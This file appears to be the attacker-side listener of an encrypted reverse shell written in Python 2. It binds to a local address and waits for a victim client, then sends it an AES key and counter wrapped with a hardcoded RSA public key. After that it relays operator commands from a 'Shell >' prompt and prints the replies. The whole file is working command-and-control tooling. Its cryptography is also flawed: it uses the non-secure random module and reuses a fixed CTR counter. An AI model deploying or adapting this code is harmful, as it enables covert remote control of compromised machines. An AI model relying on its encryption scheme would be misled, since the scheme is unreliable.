import socket
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
import random
import string

def encrypt_AES_VALUES(message):
    #This is the client's public key
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmcwI3YTfDQVQM2MHS8U9
3pBHoF65cMepj9MNVPjQeYDA53jTcRk4zvhcTfnGASDqwLY77GnrUYtdrgMqyTwe
zm0l4cVtGZ4sDcZWdozo3xALHsLtdF5BNnTul65UgacnN5rJSEpnu/4dplplRMMA
Ychs+T56Q5aaLRLjczW0B1EisvjEMHYvK9DcrGMpfWfY6BvX5W77ae7RfkrT3zVV
5ouH6e8BunLi7vU8KxEqIUeVeH0RDqTBVfua/IvxjFe9RdzXVSYwu9n2Qf0wFy56
hpPm2boFrxjer69OGBTNWHYNeC4p72kDnwSRRS2PgrUtT1aDS4URVNz6iGm1Pvbj
f1egGgIZdYYRm8op4paEjNAhttYlNfdnj3/SKuklMXoyTJVrvc0huDYvBhdA/zyn
FBbIg/vc0cuSEvuWbT3JvkAyTnn/CYsQM2elXsBWpsoe7tkr9eKjA7/l2TE2yBZG
NGbGAx08fiQHma5hOAq5+ojfrgaj8PhWWP+6gUvGpf26k5htvgAbmhbRueLv8Lck
N9bfk6SHQtBM5QsfgnrTxYTw7ObSVJliCV9OXPzMVP2lcXakPdUyvWfNRI1RNSZ0
ysOrGZHK1cFKJG9MTIz3CJaERY5VRo/yVHK9fa9s6af6Y5pQ2YXuk82PUEhAwwTp
AkZz7qXkCX+kGoCA7oqxHksCAwEAAQ==
-----END PUBLIC KEY-----'''
    
    encryptor = RSA.importKey(publickey)
    encryptedData = encryptor.encrypt(message, 0)
    return encryptedData[0]


def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return decrypto.decrypt(message)


def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('192.168.233.134', 8080))
    s.listen(1)
    conn, addr = s.accept()
    print '[+] Connection from ' + str(addr)

    #Generate the random AES key and send it to the client
    global key
    key = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
    print "The generated random key is " + str(key)
    conn.send(encrypt_AES_VALUES(key))
                  

    #Generate the random AES counter and send it to the client
    global counter
    counter = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
    print "The generated random counter is " + str(counter)
    conn.send(encrypt_AES_VALUES(counter))

    while True:
        command = raw_input("Shell > " )
 #**       command = encrypt(command)

        if 'terminate' in command:
            #Send terminate signal to the client
            conn.send(encrypt('terminate'))
            #Close the connection to the client on the server end
            conn.close()
            break

        else:
            conn.send(encrypt(command))
            print decrypt(conn.recv(4096))

def main():
    connect()


if __name__ == '__main__':
    main()

